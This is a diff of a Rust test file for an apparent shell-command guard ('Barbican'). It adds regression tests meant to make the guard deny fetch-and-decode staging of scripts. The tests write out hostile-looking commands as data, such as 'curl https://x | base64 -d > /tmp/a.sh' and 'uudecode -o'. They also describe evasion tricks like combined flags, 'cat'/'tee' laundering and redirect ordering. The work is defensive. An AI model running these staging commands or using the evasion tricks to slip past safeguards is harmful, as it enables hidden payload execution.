@@ -134,9 +134,7 @@ fn curl_piped_base64_decode_to_sh_denies() {
     // Full "fetch and stage" shape — H1 doesn't deny (curl|base64
     // has no shell stage), but H2 does.
     assert_eq!(
-        run_pre_bash(&bash_input(
-            "curl https://x | base64 -d > /tmp/a.sh"
-        )),
+        run_pre_bash(&bash_input("curl https://x | base64 -d > /tmp/a.sh")),
         2,
     );
 }
@@ -166,10 +164,7 @@ fn base64_decode_to_txt_allows() {
 
 #[test]
 fn base64_decode_to_csv_allows() {
-    assert_eq!(
-        run_pre_bash(&bash_input("echo X | base64 -d > out.csv")),
-        0,
-    );
+    assert_eq!(run_pre_bash(&bash_input("echo X | base64 -d > out.csv")), 0,);
 }
 
 #[test]
@@ -227,4 +222,190 @@ fn curl_pipe_bash_still_denies_h1() {
 #[test]
 fn ls_la_still_allows() {
     assert_eq!(run_pre_bash(&bash_input("ls -la")), 0);
+}
+
+// ---------------------------------------------------------------------
+// Regression tests for Phase-3 /crew:review findings.
+// ---------------------------------------------------------------------
+
+// ---- CRITICAL: combined short flags bypass base64 decode detection ----
+
+#[test]
+fn base64_combined_di_denies() {
+    // `-di` = decode + ignore-garbage. Exact-match string check missed it.
+    assert_eq!(
+        run_pre_bash(&bash_input("echo X | base64 -di > /tmp/a.sh")),
+        2,
+    );
+}
+
+#[test]
+fn base64_combined_id_denies() {
+    assert_eq!(
+        run_pre_bash(&bash_input("echo X | base64 -id > /tmp/a.sh")),
+        2,
+    );
+}
+
+#[test]
+fn base64_combined_big_d_i_denies() {
+    assert_eq!(
+        run_pre_bash(&bash_input("echo X | base64 -Di > /tmp/a.sh")),
+        2,
+    );
+}
+
+// ---- CRITICAL: openssl base64 -d without `enc` subcommand ----
+
+#[test]
+fn openssl_base64_d_direct_denies() {
+    // Modern openssl accepts `openssl base64 -d` without `enc`.
+    assert_eq!(
+        run_pre_bash(&bash_input("echo X | openssl base64 -d > /tmp/a.sh")),
+        2,
+    );
+}
+
+#[test]
+fn openssl_absolute_path_base64_d_denies() {
+    assert_eq!(
+        run_pre_bash(&bash_input(
+            "echo X | /usr/bin/openssl base64 -d > /tmp/a.sh"
+        )),
+        2,
+    );
+}
+
+// ---- CRITICAL: uudecode's own -o flag (no shell redirect) ----
+
+#[test]
+fn uudecode_output_flag_denies() {
+    // uudecode's canonical form writes to a file named by -o, with no
+    // shell redirect at all. Prior code only looked at `>` / `>>`.
+    assert_eq!(
+        run_pre_bash(&bash_input("cat blob.uue | uudecode -o /tmp/a.sh")),
+        2,
+    );
+}
+
+#[test]
+fn uudecode_output_flag_data_target_allows() {
+    // Negative regression: -o to a data extension is not H2.
+    assert_eq!(
+        run_pre_bash(&bash_input("cat blob.uue | uudecode -o /tmp/data.txt")),
+        0,
+    );
+}
+
+// ---- CRITICAL: laundering stage between decoder and redirect ----
+
+#[test]
+fn decode_then_cat_to_exec_denies() {
+    // `cat` between decoder and redirect is the simplest laundering
+    // stage. Any-stage-is-decoder check closes this.
+    assert_eq!(
+        run_pre_bash(&bash_input("echo X | base64 -d | cat > /tmp/a.sh")),
+        2,
+    );
+}
+
+#[test]
+fn decode_then_tee_to_exec_denies() {
+    // `tee /tmp/a.sh > /dev/null` is the classic "capture in middle of
+    // pipeline" shape. Any decoder earlier in the pipeline + tee to
+    // exec-target denies.
+    assert_eq!(
+        run_pre_bash(&bash_input(
+            "echo X | base64 -d | tee /tmp/a.sh > /dev/null"
+        )),
+        2,
+    );
+}
+
+// ---- WARNING: multi-redirect shell semantics (last wins) ----
+
+#[test]
+fn decode_multi_redirect_last_target_checked() {
+    // Shell writes to the LAST `>` target, not the first. Attacker
+    // recipe: hide the exec target behind a benign-looking first one.
+    assert_eq!(
+        run_pre_bash(&bash_input("echo X | base64 -d > /tmp/ok.txt > /tmp/a.sh")),
+        2,
+    );
+}
+
+#[test]
+fn decode_multi_redirect_last_is_data_allows() {
+    // Reverse case: attacker-shaped first, data-shaped last. Bash
+    // writes to the last — data file — so Barbican should allow.
+    assert_eq!(
+        run_pre_bash(&bash_input("echo X | base64 -d > /tmp/a.sh > /tmp/ok.txt")),
+        0,
+        "shell semantics: last > target wins; if it's a data file, allow"
+    );
+}
+
+// ---- WARNING: /dev/null and /dev/stderr are not exec targets ----
+
+#[test]
+fn xxd_reverse_to_devnull_allows() {
+    // /dev/null has no extension, so prior is_exec_target returned
+    // true. False positive: no script will ever run from /dev/null.
+    assert_eq!(
+        run_pre_bash(&bash_input("xxd -r -p /tmp/blob > /dev/null")),
+        0,
+    );
+}
+
+#[test]
+fn decode_to_devstderr_allows() {
+    assert_eq!(
+        run_pre_bash(&bash_input("echo X | base64 -d > /dev/stderr")),
+        0,
+    );
+}
+
+#[test]
+fn decode_to_devfd2_allows() {
+    assert_eq!(
+        run_pre_bash(&bash_input("echo X | base64 -d > /dev/fd/2")),
+        0,
+    );
+}
+
+// ---- WARNING: ANSI / control chars in target string ----
+
+#[test]
+fn deny_reason_is_ascii_clean_for_h2_target() {
+    // If the target string contains ANSI/control chars, the reason
+    // written to stderr must not pass them through.
+    let bin = env!("CARGO_BIN_EXE_barbican");
+    let mut child = Command::new(bin)
+        .arg("pre-bash")
+        .stdin(Stdio::piped())
+        .stdout(Stdio::null())
+        .stderr(Stdio::piped())
+        .spawn()
+        .expect("spawn");
+    // Double-quoted target with an embedded ESC (shell-level) — the
+    // parser's string dequoting strips the surrounding `"` but keeps
+    // the ESC byte in the target.
+    let json = bash_input("echo X | base64 -d > \"/tmp/\u{1b}[31ma.sh\"");
+    child
+        .stdin
+        .as_mut()
+        .unwrap()
+        .write_all(json.as_bytes())
+        .unwrap();
+    let output = child.wait_with_output().expect("wait");
+    let stderr = String::from_utf8_lossy(&output.stderr);
+    for c in stderr.chars() {
+        if c == '\n' || c == ' ' {
+            continue;
+        }
+        assert!(
+            !c.is_control(),
+            "stderr must not contain control char {c:?}; got {stderr:?}"
+        );
+    }
 }
